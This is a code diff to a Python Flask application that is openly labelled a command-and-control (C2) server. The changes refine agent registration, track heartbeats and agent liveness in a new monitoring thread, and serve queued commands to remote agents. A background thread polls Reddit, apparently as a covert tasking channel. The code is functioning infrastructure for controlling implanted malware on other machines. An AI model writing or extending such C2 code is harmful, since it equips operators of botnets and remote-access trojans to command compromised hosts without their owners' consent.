@@ -28,10 +28,21 @@ def register():
 
     agent = Agent.query.get(agent_id)
     if not agent:
-        agent = Agent(agent_id=agent_id, hostname=hostname, last_seen=datetime.utcnow(), status="Alive")
+        # First time registration
+        agent = Agent(
+            agent_id=agent_id,
+            hostname=hostname,
+            last_seen=datetime.utcnow(),
+            status="Alive"
+        )
         db.session.add(agent)
-        db.session.commit()
-    
+    else:
+        # Update existing agent info
+        agent.hostname = hostname  # in case hostname changed
+        agent.last_seen = datetime.utcnow()
+        agent.status = "Alive"
+
+    db.session.commit()
 
     return jsonify({"status": "registered", "agent_id": agent_id})
 
@@ -52,10 +63,13 @@ def heartbeat():
         now = datetime.utcnow()
         delta = (now - agent.last_seen).total_seconds()
 
-        agent.last_seen = now
-        agent.status = "Alive" if delta < 120 else "Dead"
+        if delta < 120:
+            agent.status = "Alive"
+        else:
+            agent.status = "Dead"
 
-        db.session.commit()
+        agent.last_seen = now
+
 
     cmds = Command.query.filter_by(agent_id=agent_id, status="Queued").all()
     cmd_list = [{"command_id": c.id, "command": c.command} for c in cmds]
@@ -171,10 +185,23 @@ def poll_reddit():
             requests.post(f"{SERVER_URL}/processed", json={"post_id": post.id})
 
         time.sleep(60)
+        
+def monitor_agents():
+    while True:
+        now = datetime.utcnow()
+        with app.app_context():
+            agents = Agent.query.all()
+            for a in agents:
+                delta = (now - a.last_seen).total_seconds()
+                a.status = "Alive" if delta < 120 else "Dead"
+            db.session.commit()
+        time.sleep(30)  
+
 
 if __name__ == "__main__":
     print("[+] Starting C2 Server")
 
-    t = Thread(target=poll_reddit, daemon=True)
-    t.start()
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    Thread(target=poll_reddit, daemon=True).start()
+    Thread(target=monitor_agents, daemon=True).start()
+
+    app.run(host="192.168.1.76", port=5000, debug=True)
